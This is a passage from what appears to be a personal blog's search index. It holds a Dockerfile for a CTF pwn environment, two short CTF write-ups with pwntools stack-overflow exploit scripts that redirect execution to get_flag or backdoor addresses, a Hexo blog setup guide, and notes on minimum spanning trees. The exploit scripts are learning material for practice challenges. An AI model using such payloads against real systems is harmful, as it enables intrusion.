class="line"></span><br><span class="line"></span><br><span class="line"># pwn-related tools</span><br><span class="line">RUN /pip_venv/bin/pip config set global.index-url https://pypi.org/simple &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip config set global.trusted-host pypi.org &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip install --default-timeout=100 --retries=10 -U pip &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip install --default-timeout=100 --retries=10 --no-cache-dir \</span><br><span class="line">    cryptography==39.0.1 \</span><br><span class="line">    pwntools \</span><br><span class="line">    ROPgadget \  </span><br><span class="line">    z3-solver \</span><br><span class="line">    smmap2 \</span><br><span class="line">    apscheduler \</span><br><span class="line">    ropper \</span><br><span class="line">    unicorn \</span><br><span class="line">    keystone-engine \</span><br><span class="line">    capstone </span><br><span class="line">    </span><br><span class="line"># 安装CA证书，解决SSL验证问题</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y ca-certificates &amp;&amp; \</span><br><span class="line">    update-ca-certificates &amp;&amp; \</span><br><span class="line">    rm -rf /var/lib/apt/lists/*</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"># 替换pip源为清华源，并信任相关域名</span><br><span class="line">RUN /pip_venv/bin/pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip config set global.trusted-host pypi.tuna.tsinghua.edu.cn &amp;&amp; \</span><br><span class="line">    /pip_venv/bin/pip config set global.timeout 100</span><br><span class="line">    </span><br><span class="line">RUN /pip_venv/bin/pip install --retries 20 --default-timeout 200 \</span><br><span class="line">    angr==9.2.10 \</span><br><span class="line">    pebble \</span><br><span class="line">    r2pipe \</span><br><span class="line">    git+https://github.com/lieanu/LibcSearcher.git \  </span><br><span class="line">    poetry \</span><br><span class="line">    z3-solver==4.8.8</span><br><span class="line"></span><br><span class="line"># 克隆 pwndbg 并切换到支持 Python 3.8 的分支 # 添加 Poetry 安装路径到环境变量</span><br><span class="line">RUN export PATH=&quot;/pip_venv/bin:$PATH&quot; &amp;&amp; \  </span><br><span class="line">    git clone https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="line">    cd pwndbg &amp;&amp; \</span><br><span class="line">    git checkout 2024.08.29 &amp;&amp; \</span><br><span class="line">    chmod +x setup.sh &amp;&amp; \</span><br><span class="line">    ./setup.sh</span><br><span class="line"></span><br><span class="line">CMD [&quot;/root/start.sh&quot;]</span><br><span class="line">EXPOSE 22    </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker run -d \</span><br><span class="line">-p 25001:22 \</span><br><span class="line">--name=i386_pwn \</span><br><span class="line">--cap-add=SYS_PTRACE \</span><br><span class="line">-v ~/Desktop/CTFshow_pwn:/CTFshow_pwn \</span><br><span class="line">pwnenv_ubuntu24_i386</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> docker start i386_pwn</span><br><span class="line"><span class="built_in">sudo</span> docker <span class="built_in">exec</span> -w /CTFshow_pwn -e TERM=xterm-256color -it i386_pwn bash   <span class="comment">#进入容器</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 3-分析环境搭建 </category>
          
          <category> Docker搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gets</title>
      <link href="/2025/06/2354d7c0876d.html"/>
      <url>/2025/06/2354d7c0876d.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/4CFEA279-2137-4C60-9C95-DDC38ED31AC11.png"><br>32位仅部分开启RELRO保护<br><img src="/images/F054FEF7-B882-4776-BCDB-686A78907E921.png"><br><img src="/images/5134CF56-EB95-448F-9D0C-96C479650816.png"><br><img src="/images/Pastedimage20250605152104.png"><br>栈布局：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ s[36] ] [ ebp ] [ 返回地址 ]</span><br></pre></td></tr></table></figure><p>声明了一个长度为 36 字节的字符数组 s，调用 gets 函数，并将 s 数组作为参数传递给它，然后将 gets 函数的返回值作为 ctfshow 函数的返回值。</p><p>这里是 28h，也就是 0x28，对于 32 位程序，我们 payload 还需要加 4 。<br>（根据程序是 32 位还是 64 位，对应加上 4 或 8 个字节的 ebp（栈底））<br><img src="/images/Pastedimage20250605144435.png"><br>漏洞在于 <code>printf(s)</code> 直接使用文件内容作为格式字符串，这会导致：</p><ol><li>如果文件内容包含格式化字符（如 <code>%x</code>, <code>%p</code>, <code>%s</code>），会泄露栈内存</li><li>可能造成内存崩溃（如使用 <code>%n</code> 写入内存）<br>右键Text view<br><img src="/images/Pastedimage20250605150355.png"><br>知道get_flag函数的地址在0x08048586</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn2&#x27;</span>)  <span class="comment">#本地连接</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;10.190.131.17&#x27;,51286) #远程连接</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2&#x27;</span>) </span><br><span class="line"><span class="comment"># get_flag=elf.sym[&#x27;get_flag&#x27;] #查找get_flag函数的地址</span></span><br><span class="line">get_flag_addr = <span class="number">0x08048586</span> <span class="comment">#get_flag 函数地址 </span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#构造栈溢出 payload </span></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>+<span class="number">4</span>) + p32(<span class="number">0x8048586</span>) <span class="comment"># 覆盖返回地址为 get_flag，32位程序用 p32</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload) <span class="comment">#发送 payload</span></span><br><span class="line">p.interactive() <span class="comment">#交互获取 flag 输出 </span></span><br></pre></td></tr></table></figure><p><img src="/images/6BDB377B-73EA-4D11-9676-CA8F8310F6CE.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 6-栈溢出与ROP </category>
          
          <category> 栈溢出（Stack Overflow） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>overflower</title>
      <link href="/2025/06/f3ea06acbeec.html"/>
      <url>/2025/06/f3ea06acbeec.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/705048A9-C62E-4272-B122-5AF2FADA48EF.png"><br><img src="/images/Pastedimage20250615160603.png"><br><img src="/images/Pastedimage20250615160614.png"><br><img src="/images/Pastedimage20250615160623.png"><br><img src="/images/Pastedimage20250615160632.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27; &#x27;</span>,端口号)  </span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x401146</span>  </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span> +p64(<span class="number">0x40115B</span>) + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)  </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/Pastedimage20250615160703.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 6-栈溢出与ROP </category>
          
          <category> 栈溢出（Stack Overflow） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Rhea的个人博客搭建教程</title>
      <link href="/2025/06/11915e8c8095.html"/>
      <url>/2025/06/11915e8c8095.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250612191927.png"></p><ul><li>public 最终所见网页的所有内容</li><li>node_modules 插件以及hexo所需node.js模块</li><li>_config.yml 站点配置文件，设定一些公开信息等</li><li>package.json 应用程序信息，配置hexo运行所需js包</li><li>scaffolds 模板文件夹，新建文章，会默认包含对应模板内容</li><li>themes 存放主题文件，hexo根据主题生成静态网页（速度贼快）</li><li>source 用于存放用户资源（除 <em>posts 文件夹，其余命名方式为 “</em> + 文件名”的文件被忽略）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s# 开启本地预览服务</span><br></pre></td></tr></table></figure><p><img src="/images/Pastedimage20250612192246.png"></p><p><img src="/images/b8166acda25c9e43f82211f2033095c.png">git clone -b master <a href="https://github.com/jerryc127/hexo-theme-butterfly.git">https://github.com/jerryc127/hexo-theme-butterfly.git</a> themes&#x2F;butterfly<br><strong>操作步骤</strong>：<br>① 新建自定义 CSS：在 <code>themes/butterfly/source/css/</code> 目录创建 <code>transparency.css</code>，写入透明样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 页面背景透明 */</span> </span><br><span class="line"><span class="selector-id">#web_bg</span> &#123; <span class="attribute">opacity</span>: <span class="number">0.8</span>; <span class="comment">/* 若主题已设置背景图，可叠加透明：background: rgba(255,255,255,0.8); */</span> &#125; <span class="comment">/* 卡片（文章、侧边栏）透明 */</span> <span class="selector-class">.card-widget</span>, <span class="selector-class">.post-content</span> &#123; <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>) <span class="meta">!important</span>; &#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/denjones/hexo-theme-chan.git">https://github.com/denjones/hexo-theme-chan.git</a><br><img src="/images/Pastedimage20250612205412.png"><br><img src="/images/Pastedimage20250612205824.png"></p><h2 id="二级标题1"><a href="#二级标题1" class="headerlink" title="二级标题1"></a>二级标题1</h2><p>“Live loud, leave a mark.”<br>“Walk alone, walk tall.”</p><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><p>替换图片markdown格式<br>Ctrl + Shift + F<br>Ctrl + Shift + H</p><ul><li>上方：搜索内容（ <code>!\[\[(.*?)\]\]</code>）</li><li>下方：替换内容（<code>![](/assets/images/$1)</code>）</li></ul>]]></content>
      
      
      <categories>
          
          <category> hexo-blog </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>图</title>
      <link href="/2025/06/c3f31b69c914.html"/>
      <url>/2025/06/c3f31b69c914.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-最小生成树概念"><a href="#1-最小生成树概念" class="headerlink" title="1. 最小生成树概念"></a>1. 最小生成树概念</h3><p>生成树概念：</p><blockquote><p><strong>无向图中</strong>，一个<strong>连通图</strong>的最小连通子图称作该图的生成树（不能带环，保持连通，但边要尽可能的少）。<br>有n个顶点的连通图的生成树有n个顶点和<strong>n-1条边</strong>。<br>比如：<br><img src="/images/https:/i-blog.csdnimg.cn/blog_migrate/9d864e26aa58c0192ce2318935b1caa1.png" alt="在这里插入图片描述"></p></blockquote><p>这里的最小其实是指的边的<strong>权值之和最小</strong>，当然是要在保证它是生成树的前提下权值之和最小。<br>所以，对于一个连通图来说，在它的所有的生成树里面，边的权值之和最小的生成树就是该连通图的最小生成树，当然最小生成树也可以有多个，因为边的权值是可以相等的。</p><p>连通图中的每一棵生成树，都是原图的一个<strong>极大无环子图</strong>，即：<strong>从其中删去任何一条边，生成树就不再连通；反之，在其中引入任何一条新边，都会形成一条回路。</strong></p><p>若连通图由n个顶点组成，<strong>&#x3D;&#x3D;则其生成树必含n个顶点和n-1条边&#x3D;&#x3D;</strong>。因此构造最小生成树的准则有三条：</p><ol><li>只能使用图中权值最小的边来构造最小生成树</li><li>只能使用恰好n-1条边来连接图中的n个顶点</li><li>选用的n-1条边不能构成回路</li></ol><p>构造最小生成树的方法：<br>Kruskal算法和Prim算法。<br>这两个算法都采用了逐步求解的贪心策略。</p><p>贪心算法：<br>是指在问题求解时，总是做出当前看起来最好的选择。<br>也就是说贪心算法做出的不是整体最优的的选择，而是某种意义上的局部最优解。<br><strong>贪心算法不是对所有的问题都能得到整体最优解。</strong></p><h3 id="Prim算法（普里姆）"><a href="#Prim算法（普里姆）" class="headerlink" title="&#x3D;&#x3D;Prim算法（普里姆）&#x3D;&#x3D;"></a>&#x3D;&#x3D;Prim算法（普里姆）&#x3D;&#x3D;</h3><p>思想：首先，选一个顶点作为起点，选哪个都可以；然后呢，它在选边的时候把图里面的顶点分成了两个集合，一个集合是已经被选到的结点组成的集合，另一个集合是剩下的结点组成的集合。<br>每次选边的时候是从<strong>两个集合中的顶点直接相连的边中选取权值最小的那一条。</strong></p><p>&#x3D;&#x3D;Kruskal算法（克鲁斯卡尔）&#x3D;&#x3D;<br>算法思想：<br>任给一个有n个顶点的连通图N&#x3D;{V,E}，<br>首先构造一个由这n个顶点组成、不含任何边的图G&#x3D;{V,NULL}，其中每个顶点自成一个连通分量（集合），其次不断从E中取出权值最小的一条边(若有多条权值相等任取其一)，若该边的两个顶点来自不同的连通分量，则将此边加入到G中。如此重复，直到所有顶点在同一个连通分量上为止。<br>核心：每次迭代时，选出一条具有最小权值的边，且边的两端点不在同一连通分量（集合）上，则加入生成树。<br>&#x3D;&#x3D;其实就是每次从图中还未被选到的所有的边里面选出权值最小且不会构成环的边，选够n-1条就完成了，这n-1条边构成的生成树就是该图对应的最小生成树。&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> Data structure </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
